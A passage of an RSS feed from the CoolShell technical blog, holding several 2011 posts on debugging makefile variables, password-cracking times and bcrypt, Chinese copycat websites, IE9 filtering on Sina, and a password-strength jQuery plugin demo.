<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.5">
<meta itemprop="ratingCount" content="12">
</div>
</div>
<div id="post-ratings-3738-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-02-28T09:14:10+08:00</pubDate>
<guid>https://coolshell.cn/articles/3738.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 如何调试makefile变量 ]]></title>
<link>https://coolshell.cn/articles/3790.html</link>
<content><![CDATA[ 
<p>六、七年前写过一篇《<a title="跟我一起写Makefile" href="http://blog.csdn.net/haoel/archive/2004/02/24/2886.aspx" target="_blank">跟我一起写Makefile</a>》，直到今天，还有一些朋友问我一些Makefile的问题，老实说，我有一段时间没有用Makefile了，生疏了。回顾，这几年来大家问题我的问题，其实很多时候是makefile的调试问题。所以，就像我在之前的那篇<a title="GDB中应该知道的几个调试方法" href="https://coolshell.cn/articles/3643.html" target="_blank">关于GDB的技巧的文章</a>中做的一样，在这里向大家介绍一个小小的调试变量的技巧。相信一定对你有用。</p>
<p>对于Makefile中的各种变量，可能是我们比较头痛的事了。我们要查看他们并不是很方便，需要修改makefile加入echo命令。这有时候很不方便。其实我们可以制作下面一个专门用来输出变量的makefile（假设名字叫：vars.mk）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">%:
        @echo '$*=$($*)'

d-%:
        @echo '$*=$($*)'
        @echo '  origin = $(origin $*)'
        @echo '   value = $(value  $*)'
        @echo '  flavor = $(flavor $*)'
</pre>
<p>这样一来，我们可以使用make命令的-f参数来查看makefile中的相关变量（包括make的内建变量，比如：COMPILE.c或MAKE_VERSION之类的）。<strong>注意：第二个以“d-”为前缀的目标可以用来打印关于这个变量更为详细的东西</strong>（后面有详细说明）<br>
<span id="more-3790"></span></p>
<p>假设我们的makefile是这个样子（test.mk）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">
OBJDIR := objdir
OBJS := $(addprefix $(OBJDIR)/,foo.o bar.o baz.o)

foo = $(bar)bar = $(ugh)ugh = Huh?

CFLAGS = $(include_dirs) -O
include_dirs = -Ifoo -Ibar
CFLAGS := $(CFLAGS) -Wall

MYOBJ := a.o b.o c.o
MYSRC := $(MYOBJ:.o=.c)</pre>
<p>那么，我们可以这样进行调试：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">
[<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f39b909b969db3a1bbb6bfa0a5a1c6">[email protected]</a>]$ make -f test.mk -f var.mk OBJS
OBJS=objdir/foo.o objdir/bar.o objdir/baz.o

[<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="95fdf6fdf0fbd5c7ddd0d9c6c3c7a0">[email protected]</a>]$ make -f test.mk -f var.mk d-foo
foo=Huh?
  origin = file
  value = $(bar)
  flavor = recursive

[<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="bfd7dcd7dad1ffedf7faf3ece9ed8a">[email protected]</a>]$ make -f test.mk -f var.mk d-CFLAGS
CFLAGS=-Ifoo -Ibar -O -O
  origin = file
  value = -Ifoo -Ibar -O -O
  flavor = simple

[<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f8909b909d96b8aab0bdb4abaeaacd">[email protected]</a>]$  make -f test.mk -f var.mk d-COMPILE.c
COMPILE.c=cc -Ifoo -Ibar -O -Wall   -c
  origin = default
  flavor = recursive
   value = $(CC) $(CFLAGS) $(CPPFLAGS) $(TARGET_ARCH) -c
</pre>
<p>我们可以看到：</p>
<ul>
<li>make的第一个-f后是要测试的makefile，第二个是我们的debug makefile。</li>
<li>后面直接跟变量名，如果在变量名前加”d-“，则输出更为详细的东西。</li>
</ul>
<p>说一说”d-” 前缀（其意为details），其中调用了下面三个参数。</p>
<ul>
<li><span style="font-family: 'Courier New';"><a style="font-family: 'Courier New';" href="https://www.gnu.org/software/make/manual/make.html#Origin-Function">$(origin)</a><span style="font-family: 'Courier New';">：告诉你这个变量是来自哪儿，file表示文件，environment表示环境变量，还有environment override，command line，override，automatic等。</span></span></li>
<li><span style="font-family: 'Courier New';"><a href="https://www.gnu.org/software/make/manual/make.html#Value-Function">$(value)</a>：打出这个变量没有被展开的样子。比如上述示例中的 foo 变量。</span></li>
<li><span style="font-family: 'Courier New';"><a href="https://www.gnu.org/software/make/manual/make.html#Flavor-Function">$(flavor)</a>：有两个值，simple表示是一般展开的变量，recursive表示递归展开的变量。</span></li>
</ul>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 – Qt官网的设计实践总结</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12012.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_title">State Threads 回调终结者</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11466.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11466.html" class="wp_rp_title">C语言的整型溢出问题</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3790" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="985f0e8367">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>18</strong> 人打了分，平均分： <strong>4.22</strong> )<br><span class="post-ratings-text" id="ratings_3790_text"></span><meta itemprop="name" content="如何调试makefile变量">
<meta itemprop="headline" content="如何调试makefile变量">
<meta itemprop="description" content="六、七年前写过一篇《跟我一起写Makefile》，直到今天，还有一些朋友问我一些Makefile的问题，老实说，我有一段时间没有用Makefile了，生疏了。回顾，这几年来大家问题我的问题，其实很多时候是makefile的调试问题。所以，就像我在之前的那篇关于GDB的技巧的文章中做的一样，在这里向大家介绍一个小小的调试变量的技巧。相信一定对你有用。

对于Makefile中的各种变量，可能是我...">
<meta itemprop="datePublished" content="2011-03-01T08:34:38+08:00">
<meta itemprop="dateModified" content="2011-02-27T20:37:21+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3790.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3790.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.22">
<meta itemprop="ratingCount" content="18">
</div>
</div>
<div id="post-ratings-3790-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-03-01T08:34:38+08:00</pubDate>
<guid>https://coolshell.cn/articles/3790.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 破解你的口令 ]]></title>
<link>https://coolshell.cn/articles/3801.html</link>
<content><![CDATA[ 
<p>在网上看到一张口令破解的表格，如下所示（第一列是口令长度，第二列是全小写的口令，第三列是有大写字母的口令，第四列是又加上了数字和其它字符的口令）</p>
<p><img alt="image placeholder" ></p>
<p>如果你想知道自己的口令花多少时间可以被破确，你可以访问下面这个网站：（<strong><em>更新2011/3/2晚10点15</em></strong>）</p>
<p style="text-align: center;"><strong><a href="https://howsecureismypassword.net/" target="_blank">http://howsecureismypassword.net/</a></strong></p>
<p>这里先说一个这里说的口令破解。一般来说用户的口令都是以MD5编码加密放在数据库里的，MD5是不可逆的，所以，当你拿到你一串被MD5后的字串，你可以使用暴力破解——穷举所有的可能口令的MD5字串，然后和数据库里的对比，比对了你就知道口令了。当然，你一定要清楚，在某些审查很严重的地方，互联网内容提供商不一定会把你的口令以MD5加密，甚至就是明文（Plain Text）保存，所以你还需要小心，关于如何设计你的口令，<a title="如何设计你的口令" href="https://coolshell.cn/articles/2428.html" target="_blank">请参看这篇文章</a>。</p>
<p>从上面这表格我们可以看到，你的口令最好是在8个长度以上，而且一定要有在小写和数字，最好再加上其它字符，这样你的口令被破解的时候最需要463年，这样就比较安全了。当然，如果你的口令使用了一些常用的单词，那就另说了，现在破解口令一般都不会使用暴力破解，都是用一个尝用口令字典表来尝试——比如<a title="Twitter的禁用口令" href="https://coolshell.cn/articles/2451.html" target="_blank">这篇文章所说的字典表</a>。</p>
<p>但我提醒一下，这张表里中的时间忽略了一个问题，那就是并行，<strong>可以使用多台电脑多个进程并行破解口令</strong>，这样一来，上表中的时间就可大打折扣了。你只需要愿意花2000美刀，你就能够找到一个地方，1秒种计算7亿个口令，因为MD5，SHA这类的算法性能太好了。所以，你可能需要使用新的算法来加密你的口令，这种算法最好加上时间，也就是在算法的计算时间加长。呵呵，慢也有慢的好处。可能你需要考虑一下bcrypt算法，你<a title="如何防范密码被破解" href="https://coolshell.cn/articles/2078.html" target="_blank">可以查看本站的这篇文章</a>。</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/2078.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2078.html" class="wp_rp_title">如何防范密码被破解</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6193.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6193.html" class="wp_rp_title">CSDN明文口令泄露的启示</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5353.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5353.html" class="wp_rp_title">你会做Web上的用户登录功能吗？</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3877.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3877.html" class="wp_rp_title">另类UX让你输入强口令</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2451.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2451.html" class="wp_rp_title">Twitter的禁用口令</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2428.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2428.html" class="wp_rp_title">如何管理并设计你的口令</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3801" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="a476e16b9f">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>11</strong> 人打了分，平均分： <strong>3.36</strong> )<br><span class="post-ratings-text" id="ratings_3801_text"></span><meta itemprop="name" content="破解你的口令">
<meta itemprop="headline" content="破解你的口令">
<meta itemprop="description" content="在网上看到一张口令破解的表格，如下所示（第一列是口令长度，第二列是全小写的口令，第三列是有大写字母的口令，第四列是又加上了数字和其它字符的口令）



如果你想知道自己的口令花多少时间可以被破确，你可以访问下面这个网站：（更新2011/3/2晚10点15）
http://howsecureismypassword.net/
这里先说一个这里说的口令破解。一般来说用户的口令都是以MD5编...">
<meta itemprop="datePublished" content="2011-03-02T08:35:48+08:00">
<meta itemprop="dateModified" content="2011-12-21T23:16:28+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3801.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3801.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.36">
<meta itemprop="ratingCount" content="11">
</div>
</div>
<div id="post-ratings-3801-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-03-02T08:35:48+08:00</pubDate>
<guid>https://coolshell.cn/articles/3801.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 中国的C2C模式 ]]></title>
<link>https://coolshell.cn/articles/3820.html</link>
<content><![CDATA[ 
<p style="text-align: left;">C2C不是电了商务里的C2C，而是Copy to China的缩写，以前，我们以Made in China著称，现在我们会以C2C著称。toxicat制作了下面这个图片(<a href="https://9gag.com/gag/83592" target="_blank">源图</a>)，大家慢慢欣赏，我相信，如果要把所有的C2C都列上去的话，那么，可能会上很长的一个图片。还记得那篇<a title="为什么中国的网页设计那么烂？" href="https://coolshell.cn/articles/3605.html" target="_blank">为什么中国的网页设计那么烂？</a>吗？呵呵。何止是互联网，其它东西不也是C2C吗？</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;"><span id="more-3820"></span><img alt="image placeholder" ></p>
<p style="text-align: left;">————————————————</p>
<p style="text-align: left;">与此同时，<a href="https://cn.reuters.com/article/CNTopGenNews/idCNCHINA-3878520110301" target="_blank">路透社报道</a>: 美国将百度列入“恶名市场”名单 – 美国政府周一再次将中国最大网络搜索引擎百度列入假冒和盗版产品的年度“恶名市场”名单。美国企业界希望此名单能促使美国国会对这些“流氓网站”采取行动。（<a href="https://www.bbc.co.uk/zhongwen/simp/world/2011/03/110301_china_usa_trade_piracy.shtml" target="_blank">BBC</a>：与百度一同被列入此名单的还有淘宝、北京秀水街、北京海龙电脑市场、上海杨浦颐高数码城、深圳罗湖市场、香港女人街、义务小商品市场、<a href="http://91.com/" target="_blank">91.com</a>，以及TV Ants）</p>
<p style="text-align: left;">（全文完）</p>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18094.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_title">如何免费的让网站启用HTTPS</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12225.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12225.html" class="wp_rp_title">DHH 谈混合移动应用开发</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12206.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12206.html" class="wp_rp_title">HTML6 展望</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12136.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12136.html" class="wp_rp_title">Google Inbox如何跨平台重用代码？</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12012.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_title">State Threads 回调终结者</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3820" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="0050ae1c5d">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>18</strong> 人打了分，平均分： <strong>4.28</strong> )<br><span class="post-ratings-text" id="ratings_3820_text"></span><meta itemprop="name" content="中国的C2C模式">
<meta itemprop="headline" content="中国的C2C模式">
<meta itemprop="description" content="C2C不是电了商务里的C2C，而是Copy to China的缩写，以前，我们以Made in China著称，现在我们会以C2C著称。toxicat制作了下面这个图片(源图)，大家慢慢欣赏，我相信，如果要把所有的C2C都列上去的话，那么，可能会上很长的一个图片。还记得那篇为什么中国的网页设计那么烂？吗？呵呵。何止是互联网，其它东西不也是C2C吗？


————————————————
与...">
<meta itemprop="datePublished" content="2011-03-02T08:58:17+08:00">
<meta itemprop="dateModified" content="2011-03-01T21:49:29+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3820.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3820.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.28">
<meta itemprop="ratingCount" content="18">
</div>
</div>
<div id="post-ratings-3820-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-03-02T08:58:17+08:00</pubDate>
<guid>https://coolshell.cn/articles/3820.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 微软用新浪来当反面教材 ]]></title>
<link>https://coolshell.cn/articles/3872.html</link>
<content><![CDATA[ 
<p style="text-align: left;">微软的<a href="https://blogs.msdn.com/b/ie/" target="_blank">IE的Blog</a>发布了这样<a href="http://ie.microsoft.com/testdrive/IEBlog/2011/Feb/affc-image1.png" target="_blank">一篇文章</a>，以此来展示IE9是如何过滤广告和ActiveX控件的功能。其使用了“新浪”来做为反面案例，新浪并不是第一次成为反面案例了，之前就有人用新浪等网站来表明<a title="为什么中国的网页设计那么烂？" href="https://coolshell.cn/articles/3605.html" target="_blank">中国的网站的设计是怎么个烂法</a>。呵呵。伟大的新浪。</p>
<p>下面是新浪的在IE9下没有开启过滤的样子，我们要吧看到满天飞的flash，广告，还有视频……</p>
<div class="mceTemp mceIEcenter" style="text-align: left;">
<dl class="wp-caption aligncenter" style="width: 575px;">
<dt class="wp-caption-dt"><a href="http://ie.microsoft.com/testdrive/IEBlog/2011/Feb/affc-image1.png"><img alt="image placeholder" ></a></dt>
<dd class="wp-caption-dd">新浪网站没有使用IE9的过滤功能</dd>
</dl>
</div>
<p style="text-align: left;">下面是开启了过滤功能后的新浪网页（个人感觉还是那么乱，没办法底子太差了）</p>
<p style="text-align: left;"><span id="more-3872"></span></p>
<figure style="width: 565px" class="wp-caption aligncenter"><a href="http://ie.microsoft.com/testdrive/IEBlog/2011/Feb/affc-image2.png"><img alt="image placeholder" ></a><figcaption class="wp-caption-text">IE9开启了ActiveX过滤功能后的新浪网页</figcaption></figure>
<p>(全文完)</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/8170.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_title">一次Ajax查错的经历</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5247.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5247.html" class="wp_rp_title">国内微博和Twitter的最大不同</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4914.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4914.html" class="wp_rp_title">新浪微博的XSS攻击</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3013.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_title">一些非常有意思的杂项资源</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18094.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_title">如何免费的让网站启用HTTPS</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3872" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="bd0e7cace4">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>12</strong> 人打了分，平均分： <strong>4.00</strong> )<br><span class="post-ratings-text" id="ratings_3872_text"></span><meta itemprop="name" content="微软用新浪来当反面教材">
<meta itemprop="headline" content="微软用新浪来当反面教材">
<meta itemprop="description" content="微软的IE的Blog发布了这样一篇文章，以此来展示IE9是如何过滤广告和ActiveX控件的功能。其使用了“新浪”来做为反面案例，新浪并不是第一次成为反面案例了，之前就有人用新浪等网站来表明中国的网站的设计是怎么个烂法。呵呵。伟大的新浪。
下面是新浪的在IE9下没有开启过滤的样子，我们要吧看到满天飞的flash，广告，还有视频……
  新浪网站没有使用IE9的过滤功能 
下面是开启了过滤功能...">
<meta itemprop="datePublished" content="2011-03-03T08:30:49+08:00">
<meta itemprop="dateModified" content="2011-03-02T20:14:16+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3872.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3872.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4">
<meta itemprop="ratingCount" content="12">
</div>
</div>
<div id="post-ratings-3872-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-03-03T08:30:49+08:00</pubDate>
<guid>https://coolshell.cn/articles/3872.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 另类UX让你输入强口令 ]]></title>
<link>https://coolshell.cn/articles/3877.html</link>
<content><![CDATA[ 
<p><script src="https://www.nakedpassword.com/javascripts/jquery.js" type="text/javascript"></script> <script src="https://www.nakedpassword.com/javascripts/naked_password.0.2.2.min.js" type="text/javascript"></script></p>
<p><script type="text/javascript">  	$(document).ready(function() { 	     $("input:password").nakedPassword({path: "http://www.nakedpassword.com/np_images/"}); 		});</script></p>
<p>昨天和大家说了一下<a title="破解你的口令" href="https://coolshell.cn/articles/3801.html" target="_blank">关于口令破解</a>的一些东西，那篇文章告诉我们需要设置一个比较强的不易破解的口令。</p>
<p>今天在网上看到一个强大的jQuery插件，叫<a title="NakedPassword.com" href="http://www.nakedpassword.com/" target="_blank">NakedPassword</a>，其通过“<strong>强大的用户体验</strong>”让你输入一个比较强且不易被破解的口令。虽然有点另类，但是我个人相当欣赏这个UX，因为UX实在是太到位了——<strong>只有你输入的口令比较强，图片中的女人才会脱光衣服</strong>。</p>
<p>下面是演示：</p>
<p style="text-align: center;">请输入你的口令（输入时出现效果）</p>
<p style="text-align: center;">
<input id="test" style="font-size: 25px;" type="password"></p>
<p>这个例子和<a title="用户界面和用户体验的差别" href="https://coolshell.cn/articles/3142.html" target="_blank">以前的那个例子</a>一样，告诉你UX设计是重要性。</p>
<p>（全文完）</p>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/6193.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6193.html" class="wp_rp_title">CSDN明文口令泄露的启示</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5353.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5353.html" class="wp_rp_title">你会做Web上的用户登录功能吗？</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3801.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3801.html" class="wp_rp_title">破解你的口令</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2451.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2451.html" class="wp_rp_title">Twitter的禁用口令</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2428.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2428.html" class="wp_rp_title">如何管理并设计你的口令</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2078.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2078.html" class="wp_rp_title">如何防范密码被破解</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3877" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="3885b0ef81">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>35</strong> 人打了分，平均分： <strong>3.97</strong> )<br><span class="post-ratings-text" id="ratings_3877_text"></span><meta itemprop="name" content="另类UX让你输入强口令">
<meta itemprop="headline" content="另类UX让你输入强口令">
<meta itemprop="description" content=' 
  	$(document).ready(function() { 	     $("input:password").nakedPassword({path: "http://www.nakedpassword.com/np_images/"}); 		});
